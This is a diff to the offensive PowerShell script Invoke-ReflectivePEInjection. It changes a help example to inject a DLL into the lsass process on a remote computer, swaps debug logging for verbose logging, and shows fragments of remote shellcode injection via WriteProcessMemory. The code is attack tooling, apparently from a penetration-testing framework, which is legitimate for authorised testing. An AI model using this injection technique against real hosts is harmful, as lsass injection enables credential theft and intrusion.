@@ -85,8 +85,8 @@ Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"
 
 .EXAMPLE
 
-Refectively load DemoDLL_RemoteProcess.dll in to the lsass process.
-Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass
+Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
+Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local
 
 .NOTES
 GENERAL NOTES:
@@ -2384,7 +2384,7 @@ $RemoteScriptBlock = {
 		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
 		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
-		Write-Debug "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
+		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
 		
 		
 		#Copy each section from the PE in to memory
@@ -2490,7 +2490,6 @@ $RemoteScriptBlock = {
 				{
 					Throw "Unable to allocate memory in the remote process for shellcode"
 				}
-				Write-Debug "Address of DllMain calling shellcode in remote process: $RSCAddr"
 				
 				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
 				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
@@ -2773,7 +2772,7 @@ Function Main
 		$DebugPreference  = "Continue"
 	}
 	
-	Write-Debug "PowerShell ProcessID: $PID"
+	Write-Verbose "PowerShell ProcessID: $PID"
 	
 	[Byte[]]$PEBytes = $null
 	
